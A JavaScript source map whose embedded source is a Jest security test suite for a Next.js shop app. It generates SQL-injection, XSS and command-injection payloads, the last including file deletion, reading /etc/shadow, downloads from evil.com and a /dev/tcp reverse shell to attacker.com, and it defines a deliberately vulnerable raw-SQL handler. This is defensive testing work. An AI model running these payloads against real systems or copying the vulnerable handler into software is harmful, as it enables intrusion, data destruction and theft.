{"version":3,"sources":["/Users/sachin/Documents/md-sports-/tests/security/security.test.ts"],"sourcesContent":["import { describe, it, expect, beforeAll, afterAll, beforeEach } from '@jest/globals';\nimport jwt from 'jsonwebtoken';\nimport bcrypt from 'bcryptjs';\nimport crypto from 'crypto';\n\n// Mock NextResponse\nconst NextResponse = {\n  json: (data: any, init?: ResponseInit) => ({\n    json: async () => data,\n    status: init?.status || 200,\n    headers: new Headers(init?.headers),\n  }),\n  redirect: (url: string, status?: number) => ({\n    status: status || 302,\n    headers: new Headers({ Location: url }),\n  }),\n};\n\n// Helper function to create mock NextRequest\nconst createMockNextRequest = (url: string, options: {\n  method?: string;\n  body?: any;\n  headers?: Record<string, string>;\n} = {}): any => {\n  const { method = 'GET', body, headers = {} } = options;\n  return {\n    method,\n    url,\n    headers: new Headers(headers),\n    json: async () => body ? (typeof body === 'string' ? JSON.parse(body) : body) : {},\n    text: async () => body ? (typeof body === 'string' ? body : JSON.stringify(body)) : '',\n  };\n};\n\n// Security test utilities\nclass SecurityTestUtils {\n  static generateSQLInjectionPayloads(): string[] {\n    return [\n      \"'; DROP TABLE users; --\",\n      \"' OR '1'='1\",\n      \"' UNION SELECT * FROM users --\",\n      \"'; INSERT INTO users (email, password) VALUES ('hacker@evil.com', 'password'); --\",\n      \"' OR 1=1 --\",\n      \"admin'--\",\n      \"admin'/*\",\n      \"' OR 'x'='x\",\n      \"') OR ('1'='1\",\n      \"' OR 1=1#\",\n    ];\n  }\n\n  static generateXSSPayloads(): string[] {\n    return [\n      \"<script>alert('XSS')</script>\",\n      \"javascript:alert('XSS')\",\n      \"<img src=x onerror=alert('XSS')>\",\n      \"<svg onload=alert('XSS')>\",\n      \"<iframe src=javascript:alert('XSS')></iframe>\",\n      \"<body onload=alert('XSS')>\",\n      \"<input onfocus=alert('XSS') autofocus>\",\n      \"<select onfocus=alert('XSS') autofocus>\",\n      \"<textarea onfocus=alert('XSS') autofocus>\",\n      \"<keygen onfocus=alert('XSS') autofocus>\",\n    ];\n  }\n\n  static generateCommandInjectionPayloads(): string[] {\n    return [\n      \"; ls -la\",\n      \"| cat /etc/passwd\",\n      \"&& rm -rf /\",\n      \"; cat /etc/shadow\",\n      \"| nc -l 4444\",\n      \"; wget http://evil.com/malware\",\n      \"&& curl http://evil.com/steal-data\",\n      \"; python -c 'import os; os.system(\\\"rm -rf /\\\")'\",\n      \"| bash -i >& /dev/tcp/attacker.com/8080 0>&1\",\n      \"; /bin/bash\",\n    ];\n  }\n\n  static generateLongStrings(): string[] {\n    return [\n      'A'.repeat(1000),\n      'A'.repeat(10000),\n      'A'.repeat(100000),\n      '\\x00'.repeat(1000), // Null bytes\n      '\\n'.repeat(1000), // Newlines\n      '\\r'.repeat(1000), // Carriage returns\n    ];\n  }\n\n  static generateInvalidTokens(): string[] {\n    return [\n      'invalid.token.here',\n      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature',\n      '', // Empty token\n      'Bearer', // Just Bearer\n      'null',\n      'undefined',\n      '{}',\n      'admin',\n      '../../etc/passwd',\n      '<script>alert(\"xss\")</script>',\n    ];\n  }\n\n  static async hashPassword(password: string): Promise<string> {\n    return bcrypt.hash(password, 10);\n  }\n\n  static generateValidJWT(payload: any, secret: string = 'test-secret'): string {\n    return jwt.sign(payload, secret, { expiresIn: '1h' });\n  }\n\n  static generateExpiredJWT(payload: any, secret: string = 'test-secret'): string {\n    return jwt.sign(payload, secret, { expiresIn: '-1h' });\n  }\n}\n\n// Mock API handlers for security testing\nconst mockPrisma = {\n  user: {\n    findUnique: jest.fn(),\n    findMany: jest.fn(),\n    create: jest.fn(),\n    update: jest.fn(),\n  },\n  product: {\n    findMany: jest.fn(),\n    create: jest.fn(),\n  },\n  $queryRaw: jest.fn(),\n  $executeRaw: jest.fn(),\n};\n\n// Mock vulnerable endpoint for testing\nconst vulnerableSearchHandler = async (req: NextRequest) => {\n  const url = new URL(req.url);\n  const query = url.searchParams.get('q');\n  \n  if (!query) {\n    return NextResponse.json({ error: 'Query required' }, { status: 400 });\n  }\n\n  // Simulate SQL injection vulnerability (for testing purposes)\n  try {\n    // This would be vulnerable in real code - DON'T DO THIS\n    const results = await mockPrisma.$queryRaw`\n      SELECT * FROM products WHERE name LIKE '%${query}%'\n    `;\n    \n    return NextResponse.json({ results });\n  } catch (error) {\n    return NextResponse.json({ error: 'Database error' }, { status: 500 });\n  }\n};\n\n// Secure search handler for comparison\nconst secureSearchHandler = async (req: NextRequest) => {\n  const url = new URL(req.url);\n  const query = url.searchParams.get('q');\n  \n  if (!query) {\n    return NextResponse.json({ error: 'Query required' }, { status: 400 });\n  }\n\n  // Input validation\n  if (query.length > 100) {\n    return NextResponse.json({ error: 'Query too long' }, { status: 400 });\n  }\n\n  // Check for suspicious SQL injection patterns\n  const suspiciousPatterns = [\n    /drop\\s+table/i,\n    /union\\s+select/i,\n    /insert\\s+into/i,\n    /delete\\s+from/i,\n    /update\\s+.*set/i,\n    /or\\s+['\"]?1['\"]?\\s*=\\s*['\"]?1['\"]?/i,\n    /or\\s+['\"]?x['\"]?\\s*=\\s*['\"]?x['\"]?/i,\n    /--/,\n    /\\/\\*/,\n    /#/\n  ];\n\n  const isSuspicious = suspiciousPatterns.some(pattern => pattern.test(query));\n  \n  if (isSuspicious) {\n    return NextResponse.json({ error: 'Invalid query detected' }, { status: 400 });\n  }\n\n  // Sanitize input\n  const sanitizedQuery = query.replace(/[<>\"'&]/g, '');\n  \n  try {\n    // Use parameterized queries\n    const results = await mockPrisma.product.findMany({\n      where: {\n        name: {\n          contains: sanitizedQuery,\n          mode: 'insensitive',\n        },\n      },\n    });\n    \n    return NextResponse.json({ results });\n  } catch (error) {\n    return NextResponse.json({ error: 'Database error' }, { status: 500 });\n  }\n};\n\n// Authentication handler with security measures\nconst secureAuthHandler = async (req: NextRequest) => {\n  const body = await req.json();\n  const { email, password } = body;\n\n  // Rate limiting simulation\n  const clientIP = req.headers.get('x-forwarded-for') || 'unknown';\n  \n  // Input validation\n  if (!email || !password) {\n    return NextResponse.json(\n      { error: 'Email and password are required' },\n      { status: 400 }\n    );\n  }\n\n  if (email.length > 254 || password.length > 128) {\n    return NextResponse.json(\n      { error: 'Input too long' },\n      { status: 400 }\n    );\n  }\n\n  // Check for suspicious patterns first\n  const suspiciousPatterns = [\n    /<script/i,\n    /javascript:/i,\n    /on\\w+=/i,\n    /\\bor\\b.*\\b1\\s*=\\s*1\\b/i,\n    /union.*select/i,\n    /drop.*table/i,\n  ];\n\n  const isSuspicious = suspiciousPatterns.some(pattern => \n    pattern.test(email) || pattern.test(password)\n  );\n\n  if (isSuspicious) {\n    return NextResponse.json(\n      { error: 'Invalid input detected' },\n      { status: 400 }\n    );\n  }\n\n  // Email format validation\n  const emailRegex = /^[a-zA-Z0-9]([a-zA-Z0-9._-]*[a-zA-Z0-9])?@[a-zA-Z0-9]([a-zA-Z0-9.-]*[a-zA-Z0-9])?\\.[a-zA-Z]{2,}$/;\n  const hasControlChars = /[\\x00-\\x1F\\x7F]/.test(email) || /[\\x00-\\x1F\\x7F]/.test(password);\n  const hasConsecutiveDots = /\\.{2,}/.test(email);\n  \n  if (!emailRegex.test(email) || hasControlChars || hasConsecutiveDots) {\n    return NextResponse.json(\n      { error: 'Invalid email format' },\n      { status: 400 }\n    );\n  }\n\n  try {\n    const user = await mockPrisma.user.findUnique({\n      where: { email },\n    });\n\n    if (!user) {\n      // Constant time delay to prevent timing attacks\n      await new Promise(resolve => setTimeout(resolve, 100));\n      return NextResponse.json(\n        { error: 'Invalid credentials' },\n        { status: 401 }\n      );\n    }\n\n    const isValid = await bcrypt.compare(password, user.password);\n    if (!isValid) {\n      return NextResponse.json(\n        { error: 'Invalid credentials' },\n        { status: 401 }\n      );\n    }\n\n    // Generate secure token\n    const token = jwt.sign(\n      { \n        userId: user.id, \n        email: user.email,\n        iat: Math.floor(Date.now() / 1000),\n      },\n      'test-secret',\n      { \n        expiresIn: '15m',\n        issuer: 'md-sports',\n        audience: 'md-sports-client',\n      }\n    );\n\n    return NextResponse.json({\n      user: {\n        id: user.id,\n        email: user.email,\n        name: user.name,\n      },\n      token,\n    });\n  } catch (error) {\n    return NextResponse.json(\n      { error: 'Internal server error' },\n      { status: 500 }\n    );\n  }\n};\n\ndescribe('Security Tests', () => {\n  beforeAll(() => {\n    process.env.JWT_SECRET = 'test-secret-key-for-security-testing';\n  });\n\n  beforeEach(() => {\n    jest.clearAllMocks();\n  });\n\n  describe('SQL Injection Protection', () => {\n    it('should prevent SQL injection in search queries', async () => {\n      const sqlPayloads = SecurityTestUtils.generateSQLInjectionPayloads();\n      \n      for (const payload of sqlPayloads) {\n        const request = createMockNextRequest(\n          `http://localhost:3000/api/search?q=${encodeURIComponent(payload)}`\n        );\n\n        // Test with secure handler\n        const response = await secureSearchHandler(request);\n        \n        // Should not return 500 error or expose database structure\n        expect(response.status).not.toBe(500);\n        \n        const data = await response.json();\n        expect(data).not.toHaveProperty('results');\n      }\n    });\n\n    it('should use parameterized queries', async () => {\n      mockPrisma.product.findMany.mockResolvedValue([]);\n      \n      const request = createMockNextRequest(\n        \"http://localhost:3000/api/search?q=test<script>&alert\"\n      );\n\n      await secureSearchHandler(request);\n      \n      // Verify parameterized query was used\n      expect(mockPrisma.product.findMany).toHaveBeenCalledWith({\n        where: {\n          name: {\n            contains: \"testscriptalert\", // Sanitized\n            mode: 'insensitive',\n          },\n        },\n      });\n    });\n  });\n\n  describe('XSS Protection', () => {\n    it('should sanitize XSS payloads in input', async () => {\n      const xssPayloads = SecurityTestUtils.generateXSSPayloads();\n      \n      for (const payload of xssPayloads) {\n        const request = createMockNextRequest(\n          `http://localhost:3000/api/search?q=${encodeURIComponent(payload)}`\n        );\n\n        const response = await secureSearchHandler(request);\n        const data = await response.json();\n        \n        // Should not contain script tags or javascript\n        if (data.results) {\n          const responseStr = JSON.stringify(data);\n          expect(responseStr).not.toMatch(/<script/i);\n          expect(responseStr).not.toMatch(/javascript:/i);\n          expect(responseStr).not.toMatch(/on\\w+=/i);\n        }\n      }\n    });\n\n    it('should reject suspicious input patterns', async () => {\n      const request = createMockNextRequest('http://localhost:3000/api/auth/login', {\n        method: 'POST',\n        body: {\n          email: '<script>alert(\"xss\")</script>@test.com',\n          password: 'password123',\n        },\n        headers: {\n          'Content-Type': 'application/json',\n        },\n      });\n\n      const response = await secureAuthHandler(request);\n      const data = await response.json();\n      \n      expect(response.status).toBe(400);\n      expect(data.error).toBe('Invalid input detected');\n    });\n  });\n\n  describe('Authentication Security', () => {\n    const testSecret = 'test-secret';\n    \n    it('should reject invalid JWT tokens', async () => {\n      const invalidTokens = SecurityTestUtils.generateInvalidTokens();\n      \n      for (const token of invalidTokens) {\n        expect(() => {\n          jwt.verify(token, testSecret);\n        }).toThrow();\n      }\n    });\n\n    it('should reject expired tokens', async () => {\n      const expiredToken = SecurityTestUtils.generateExpiredJWT({\n        userId: 1,\n        email: 'test@example.com',\n      }, testSecret);\n      \n      expect(() => {\n        jwt.verify(expiredToken, testSecret);\n      }).toThrow('jwt expired');\n    });\n\n    it('should use secure password hashing', async () => {\n      const password = 'testpassword123';\n      const hash = await SecurityTestUtils.hashPassword(password);\n      \n      // Should be bcrypt hash\n      expect(hash).toMatch(/^\\$2[aby]\\$\\d+\\$/);\n      \n      // Should not be the original password\n      expect(hash).not.toBe(password);\n      \n      // Should verify correctly\n      const isValid = await bcrypt.compare(password, hash);\n      expect(isValid).toBe(true);\n      \n      // Should not verify with wrong password\n      const isInvalid = await bcrypt.compare('wrongpassword', hash);\n      expect(isInvalid).toBe(false);\n    });\n\n    it('should prevent timing attacks in authentication', async () => {\n      const validEmail = 'test@example.com';\n      const invalidEmail = 'nonexistent@example.com';\n      \n      // Mock user lookup\n      mockPrisma.user.findUnique.mockImplementation(({ where }) => {\n        if (where.email === validEmail) {\n          return Promise.resolve({\n            id: 1,\n            email: validEmail,\n            password: '$2a$10$hashedPassword',\n            name: 'Test User',\n          });\n        }\n        return Promise.resolve(null);\n      });\n\n      const validRequest = createMockNextRequest('http://localhost:3000/api/auth/login', {\n        method: 'POST',\n        body: {\n          email: validEmail,\n          password: 'wrongpassword',\n        },\n        headers: {\n          'Content-Type': 'application/json',\n        },\n      });\n\n      const invalidRequest = createMockNextRequest('http://localhost:3000/api/auth/login', {\n        method: 'POST',\n        body: {\n          email: invalidEmail,\n          password: 'wrongpassword',\n        },\n        headers: {\n          'Content-Type': 'application/json',\n        },\n      });\n\n      // Measure response times\n      const start1 = Date.now();\n      const response1 = await secureAuthHandler(validRequest);\n      const time1 = Date.now() - start1;\n\n      const start2 = Date.now();\n      const response2 = await secureAuthHandler(invalidRequest);\n      const time2 = Date.now() - start2;\n\n      // Both should return 401\n      expect(response1.status).toBe(401);\n      expect(response2.status).toBe(401);\n      \n      // Response times should be similar (within 200ms)\n      expect(Math.abs(time1 - time2)).toBeLessThan(200);\n    });\n  });\n\n  describe('Input Validation', () => {\n    it('should reject oversized inputs', async () => {\n      const longStrings = SecurityTestUtils.generateLongStrings();\n      \n      for (const longString of longStrings) {\n        const request = createMockNextRequest('http://localhost:3000/api/auth/login', {\n          method: 'POST',\n          body: {\n            email: longString,\n            password: 'password123',\n          },\n          headers: {\n            'Content-Type': 'application/json',\n          },\n        });\n\n        const response = await secureAuthHandler(request);\n        \n        expect(response.status).toBe(400);\n      }\n    });\n\n    it('should validate email format', async () => {\n      const invalidEmails = [\n        'invalid-email',\n        '@domain.com',\n        'user@',\n        'user..name@domain.com',\n        'user@domain',\n        'user name@domain.com',\n      ];\n      \n      // Test empty email separately as it triggers a different error\n      const emptyEmailRequest = createMockNextRequest('http://localhost:3000/api/auth/login', {\n        method: 'POST',\n        body: {\n          email: '',\n          password: 'password123',\n        },\n        headers: {\n          'Content-Type': 'application/json',\n        },\n      });\n      \n      const emptyEmailResponse = await secureAuthHandler(emptyEmailRequest);\n      const emptyEmailData = await emptyEmailResponse.json();\n      \n      expect(emptyEmailResponse.status).toBe(400);\n      expect(emptyEmailData.error).toBe('Email and password are required');\n      \n      for (const email of invalidEmails) {\n        const request = createMockNextRequest('http://localhost:3000/api/auth/login', {\n          method: 'POST',\n          body: {\n            email,\n            password: 'password123',\n          },\n          headers: {\n            'Content-Type': 'application/json',\n          },\n        });\n\n        const response = await secureAuthHandler(request);\n        const data = await response.json();\n        \n        expect(response.status).toBe(400);\n        expect(data.error).toBe('Invalid email format');\n      }\n    });\n\n    it('should handle null bytes and special characters', async () => {\n      const maliciousInputs = [\n        'test\\x00@example.com',\n        'test\\r\\n@example.com',\n        'test\\t@example.com',\n        'test\\b@example.com',\n      ];\n      \n      for (const input of maliciousInputs) {\n        const request = createMockNextRequest('http://localhost:3000/api/auth/login', {\n          method: 'POST',\n          body: {\n            email: input,\n            password: 'password123',\n          },\n          headers: {\n            'Content-Type': 'application/json',\n          },\n        });\n\n        const response = await secureAuthHandler(request);\n        \n        expect(response.status).toBe(400);\n      }\n    });\n  });\n\n  describe('Command Injection Protection', () => {\n    it('should prevent command injection in file operations', () => {\n      const commandPayloads = SecurityTestUtils.generateCommandInjectionPayloads();\n      \n      for (const payload of commandPayloads) {\n        // Simulate file name validation\n        const isValidFileName = (filename: string): boolean => {\n          // Only allow alphanumeric, dots, hyphens, and underscores\n          return /^[a-zA-Z0-9._-]+$/.test(filename);\n        };\n        \n        expect(isValidFileName(payload)).toBe(false);\n      }\n    });\n  });\n\n  describe('JWT Security', () => {\n    const testSecret = 'test-secret';\n    \n    it('should use secure JWT configuration', () => {\n      const payload = { userId: 1, email: 'test@example.com' };\n      const secret = 'test-secret';\n      const token = SecurityTestUtils.generateValidJWT(payload, secret);\n      \n      const decoded = jwt.verify(token, secret) as any;\n      \n      expect(decoded.userId).toBe(1);\n      expect(decoded.email).toBe('test@example.com');\n      expect(decoded.iat).toBeDefined();\n      expect(decoded.exp).toBeDefined();\n    });\n\n    it('should not accept tokens with none algorithm', () => {\n      // Create a token with 'none' algorithm (security vulnerability)\n      const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');\n      const payload = Buffer.from(JSON.stringify({ userId: 1, email: 'test@example.com' })).toString('base64url');\n      const noneToken = `${header}.${payload}.`;\n      \n      expect(() => {\n        jwt.verify(noneToken, testSecret);\n      }).toThrow();\n    });\n\n    it('should validate token signature', () => {\n      const validToken = SecurityTestUtils.generateValidJWT({ userId: 1 }, testSecret);\n      const [header, payload, signature] = validToken.split('.');\n      const tamperedToken = `${header}.${payload}.tampered_signature`;\n      \n      expect(() => {\n        jwt.verify(tamperedToken, testSecret);\n      }).toThrow('invalid signature');\n    });\n  });\n\n  describe('Rate Limiting Simulation', () => {\n    it('should handle rapid successive requests', async () => {\n      const requests = Array.from({ length: 100 }, () => \n        createMockNextRequest('http://localhost:3000/api/auth/login', {\n          method: 'POST',\n          body: {\n            email: 'test@example.com',\n            password: 'password123',\n          },\n          headers: {\n            'Content-Type': 'application/json',\n            'X-Forwarded-For': '192.168.1.100',\n          },\n        })\n      );\n\n      // In a real implementation, this would trigger rate limiting\n      const responses = await Promise.all(\n        requests.map(req => secureAuthHandler(req))\n      );\n\n      // All requests should be processed (in real app, some would be rate limited)\n      responses.forEach(response => {\n        expect([400, 401, 429]).toContain(response.status); // 429 = Too Many Requests\n      });\n    });\n  });\n\n  describe('Error Handling Security', () => {\n    it('should not expose sensitive information in error messages', async () => {\n      // Simulate database error\n      mockPrisma.user.findUnique.mockRejectedValue(new Error('Connection failed to database \"md_sports\" on host \"localhost\"'));\n      \n      const request = createMockNextRequest('http://localhost:3000/api/auth/login', {\n        method: 'POST',\n        body: {\n          email: 'test@example.com',\n          password: 'password123',\n        },\n        headers: {\n          'Content-Type': 'application/json',\n        },\n      });\n\n      const response = await secureAuthHandler(request);\n      const data = await response.json();\n      \n      expect(response.status).toBe(500);\n      expect(data.error).toBe('Internal server error');\n      expect(data.error).not.toContain('database');\n      expect(data.error).not.toContain('localhost');\n      expect(data.error).not.toContain('md_sports');\n    });\n\n    it('should use generic error messages for authentication failures', async () => {\n      mockPrisma.user.findUnique.mockResolvedValue(null);\n      \n      const request = createMockNextRequest('http://localhost:3000/api/auth/login', {\n        method: 'POST',\n        body: {\n          email: 'nonexistent@example.com',\n          password: 'password123',\n        },\n        headers: {\n          'Content-Type': 'application/json',\n        },\n      });\n\n      const response = await secureAuthHandler(request);\n      const data = await response.json();\n      \n      expect(response.status).toBe(401);\n      expect(data.error).toBe('Invalid credentials');\n      expect(data.error).not.toContain('user not found');\n      expect(data.error).not.toContain('email');\n    });\n  });\n});"],"names":["NextResponse","json","data","init","status","headers","Headers","redirect","url","Location","createMockNextRequest","options","method","body","JSON","parse","text","stringify","SecurityTestUtils","generateSQLInjectionPayloads","generateXSSPayloads","generateCommandInjectionPayloads","generateLongStrings","repeat","generateInvalidTokens","hashPassword","password","bcrypt","hash","generateValidJWT","payload","secret","jwt","sign","expiresIn","generateExpiredJWT","mockPrisma","user","findUnique","jest","fn","findMany","create","update","product","$queryRaw","$executeRaw","vulnerableSearchHandler","req","URL","query","searchParams","get","error","results","secureSearchHandler","length","suspiciousPatterns","isSuspicious","some","pattern","test","sanitizedQuery","replace","where","name","contains","mode","secureAuthHandler","email","clientIP","emailRegex","hasControlChars","hasConsecutiveDots","Promise","resolve","setTimeout","isValid","compare","token","userId","id","iat","Math","floor","Date","now","issuer","audience","describe","beforeAll","process","env","JWT_SECRET","beforeEach","clearAllMocks","it","sqlPayloads","request","encodeURIComponent","response","expect","not","toBe","toHaveProperty","mockResolvedValue","toHaveBeenCalledWith","xssPayloads","responseStr","toMatch","testSecret","invalidTokens","verify","toThrow","expiredToken","isInvalid","validEmail","invalidEmail","mockImplementation","validRequest","invalidRequest","start1","response1","time1","start2","response2","time2","abs","toBeLessThan","longStrings","longString","invalidEmails","emptyEmailRequest","emptyEmailResponse","emptyEmailData","maliciousInputs","input","commandPayloads","isValidFileName","filename","decoded","toBeDefined","exp","header","Buffer","from","alg","typ","toString","noneToken","validToken","signature","split","tamperedToken","requests","Array","responses","all","map","forEach","toContain","mockRejectedValue","Error"],"mappings":"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